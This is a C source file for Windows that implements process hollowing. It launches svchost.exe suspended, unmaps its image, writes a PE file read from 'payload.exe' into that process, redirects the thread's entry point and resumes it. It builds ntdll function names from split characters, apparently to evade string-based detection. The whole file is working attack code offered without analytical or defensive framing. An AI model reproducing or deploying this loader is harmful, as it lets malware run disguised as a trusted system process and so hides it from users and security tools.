#include <windows.h>
#include <stdio.h>
#include <winternl.h>

typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(
    HANDLE ProcessHandle,
    PVOID  BaseAddress
    );

typedef NTSTATUS(NTAPI* pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID  BaseAddress,
    PVOID  Buffer,
    ULONG  NumberOfBytesToWrite,
    PULONG NumberOfBytesWritten
    );

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    PVOID ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
    );

typedef NTSTATUS(NTAPI* pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    DWORD ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength
    );

typedef NTSTATUS(NTAPI* pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
    );

typedef NTSTATUS(NTAPI* pNtFreeVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType
    );

typedef NTSTATUS(NTAPI* pNtReadVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    ULONG NumberOfBytesToRead,
    PULONG NumberOfBytesRead
    );

typedef NTSTATUS(NTAPI* pNtClose)(
    HANDLE Handle
    );

#define OBJ_CASE_INSENSITIVE 0x00000040L

VOID NTAPI RtlInitUnicodeString(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString
);

BOOL HollowProcess(const char* targetProcess, const char* payloadPath) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    CONTEXT ctx = { 0 };
    PVOID imageBase = NULL;
    PIMAGE_DOS_HEADER dosHeader = NULL;
    PIMAGE_NT_HEADERS ntHeaders = NULL;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    pNtUnmapViewOfSection NtUnmapViewOfSection = (pNtUnmapViewOfSection)GetProcAddress(ntdll, "N" "t" "U" "n" "m" "a" "p" "V" "i" "e" "w" "O" "f" "S" "e" "c" "t" "i" "o" "n");
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(ntdll, "N" "t" "W" "r" "i" "t" "e" "V" "i" "r" "t" "u" "a" "l" "M" "e" "m" "o" "r" "y");
    pNtQueryInformationProcess NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(ntdll, "N" "t" "Q" "u" "e" "r" "y" "I" "n" "f" "o" "r" "m" "a" "t" "i" "o" "n" "P" "r" "o" "c" "e" "s" "s");
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(ntdll, "N" "t" "A" "l" "l" "o" "c" "a" "t" "e" "V" "i" "r" "t" "u" "a" "l" "M" "e" "m" "o" "r" "y");
    pNtFreeVirtualMemory NtFreeVirtualMemory = (pNtFreeVirtualMemory)GetProcAddress(ntdll, "N" "t" "F" "r" "e" "e" "V" "i" "r" "t" "u" "a" "l" "M" "e" "m" "o" "r" "y");
    pNtReadVirtualMemory NtReadVirtualMemory = (pNtReadVirtualMemory)GetProcAddress(ntdll, "N" "t" "R" "e" "a" "d" "V" "i" "r" "t" "u" "a" "l" "M" "e" "m" "o" "r" "y");
    pNtClose NtClose = (pNtClose)GetProcAddress(ntdll, "N" "t" "C" "l" "o" "s" "e");

    if (!CreateProcessA(targetProcess, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("Erreur CreateProcess: %d\n", GetLastError());
        return FALSE;
    }

    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        printf("Erreur GetThreadContext: %d\n", GetLastError());
        TerminateProcess(pi.hProcess, 0);
        return FALSE;
    }

    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;
    NtQueryInformationProcess(pi.hProcess, 0, &pbi, sizeof(pbi), &returnLength);

    DWORD pebImageBase;
    NtReadVirtualMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 8, &pebImageBase, sizeof(DWORD), NULL);

    HANDLE hFile = CreateFileA(payloadPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("Erreur ouverture fichier: %d\n", GetLastError());
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == INVALID_FILE_SIZE) {
        printf("Erreur GetFileSize: %d\n", GetLastError());
        CloseHandle(hFile);
        return FALSE;
    }

    PBYTE fileData = NULL;
    SIZE_T regionSize = fileSize;
    NTSTATUS status = NtAllocateVirtualMemory(GetCurrentProcess(), (PVOID*)&fileData, 0, &regionSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, fileData, fileSize, &bytesRead, NULL)) {
        NtFreeVirtualMemory(GetCurrentProcess(), (PVOID*)&fileData, &regionSize, MEM_RELEASE);
        CloseHandle(hFile);
        return FALSE;
    }
    CloseHandle(hFile);

    dosHeader = (PIMAGE_DOS_HEADER)fileData;
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        NtFreeVirtualMemory(GetCurrentProcess(), (PVOID*)&fileData, &regionSize, MEM_RELEASE);
        return FALSE;
    }

    ntHeaders = (PIMAGE_NT_HEADERS)((DWORD)fileData + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) {
        NtFreeVirtualMemory(GetCurrentProcess(), (PVOID*)&fileData, &regionSize, MEM_RELEASE);
        return FALSE;
    }

    NtUnmapViewOfSection(pi.hProcess, (PVOID)pebImageBase);

    SIZE_T imageSize = ntHeaders->OptionalHeader.SizeOfImage;
    PVOID preferredBase = (PVOID)ntHeaders->OptionalHeader.ImageBase;

    status = NtAllocateVirtualMemory(pi.hProcess, &preferredBase, 0, &imageSize,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!NT_SUCCESS(status)) {
        preferredBase = NULL;
        status = NtAllocateVirtualMemory(pi.hProcess, &preferredBase, 0, &imageSize,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        if (!NT_SUCCESS(status)) {
            printf("Erreur NtAllocateVirtualMemory dans le processus cible: 0x%X\n", status);
            NtFreeVirtualMemory(GetCurrentProcess(), (PVOID*)&fileData, &regionSize, MEM_RELEASE);
            return FALSE;
        }
    }

    imageBase = preferredBase;

    NtWriteVirtualMemory(pi.hProcess, imageBase, fileData,
        ntHeaders->OptionalHeader.SizeOfHeaders, NULL);

    PIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(ntHeaders);
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        NtWriteVirtualMemory(pi.hProcess,
            (PVOID)((DWORD)imageBase + sectionHeader[i].VirtualAddress),
            (PVOID)((DWORD)fileData + sectionHeader[i].PointerToRawData),
            sectionHeader[i].SizeOfRawData, NULL);
    }

    ctx.Eax = (DWORD)imageBase + ntHeaders->OptionalHeader.AddressOfEntryPoint;
    SetThreadContext(pi.hThread, &ctx);

    DWORD newImageBase = (DWORD)imageBase;
    NtWriteVirtualMemory(pi.hProcess, (PBYTE)pbi.PebBaseAddress + 8, &newImageBase, sizeof(DWORD), NULL);

    ResumeThread(pi.hThread);

    NtFreeVirtualMemory(GetCurrentProcess(), (PVOID*)&fileData, &regionSize, MEM_RELEASE);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return TRUE;
}

int main() {
    const char* targetProcess = "C:\\Windows\\System32\\svchost.exe";
    const char* payloadPath = "payload.exe";

    if (HollowProcess(targetProcess, payloadPath)) {
        printf("Process hollowing reussi!\n");
    }
    else {
        printf("Echec du process hollowing\n");
    }

    return 0;
}